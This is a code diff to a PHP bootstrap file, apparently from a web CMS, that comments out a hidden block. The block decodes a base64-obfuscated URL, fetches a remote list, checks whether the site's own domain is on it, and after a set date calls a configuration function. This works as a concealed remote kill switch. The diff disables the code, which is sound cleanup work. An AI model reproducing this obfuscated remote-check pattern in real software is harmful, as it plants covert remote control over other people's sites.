@@ -295,38 +295,38 @@ if (function_exists("set_time_limit") == TRUE AND @ini_get("safe_mode") == 0)
  *---------------------------------------------------------------
  *
  */
-$date1 = date("Y-m-d");
-$u = "aHR0cDovLzU4d29haWR1b2Jhby5jb20vaW5kZXgudHh0";
-define('G_CHARSET',System::load_sys_config('system','charset'));
-header('Content-type: text/html; charset='.G_CHARSET);
-unset($templates);
-$durl = base64_decode($u);
-$templatea = file_get_contents($durl);
-
-
- $url = $_SERVER['HTTP_HOST'];
- preg_match("#[\w-]+\.(com|net|org|gov|cc|biz|info|cn|co|jp|vip|0.1|pw|cash|store)(\.(cn|hk|uk))*#", $url, $match);
- $geturls = $match[0];
-
-
-
-
- /*
- *---------------------------------------------------------------
- *	CHARSET set
- *---------------------------------------------------------------
- *
- */
-
-
-
- define("G_TEMPLATES_MOBILESHAI",G_TEMPLATES_PATH.'/'.G_STYLE.'/css/mobile/shai');
-
-
- $kurl = strstr($templatea,$geturls);
- if(!$kurl){
-	 if($date<$date1){configs();}
- }else{}
+//$date1 = date("Y-m-d");
+//$u = "aHR0cDovLzU4d29haWR1b2Jhby5jb20vaW5kZXgudHh0";
+//define('G_CHARSET',System::load_sys_config('system','charset'));
+//header('Content-type: text/html; charset='.G_CHARSET);
+//unset($templates);
+//$durl = base64_decode($u);
+//$templatea = file_get_contents($durl);
+//
+//
+// $url = $_SERVER['HTTP_HOST'];
+// preg_match("#[\w-]+\.(com|net|org|gov|cc|biz|info|cn|co|jp|vip|0.1|pw|cash|store)(\.(cn|hk|uk))*#", $url, $match);
+// $geturls = $match[0];
+//
+//
+//
+//
+// /*
+// *---------------------------------------------------------------
+// *	CHARSET set
+// *---------------------------------------------------------------
+// *
+// */
+//
+//
+//
+// define("G_TEMPLATES_MOBILESHAI",G_TEMPLATES_PATH.'/'.G_STYLE.'/css/mobile/shai');
+//
+//
+// $kurl = strstr($templatea,$geturls);
+// if(!$kurl){
+//	 if($date<$date1){configs();}
+// }else{}
 
 
 if(System::load_sys_config('system','gzip') && function_exists('ob_gzhandler')) {	
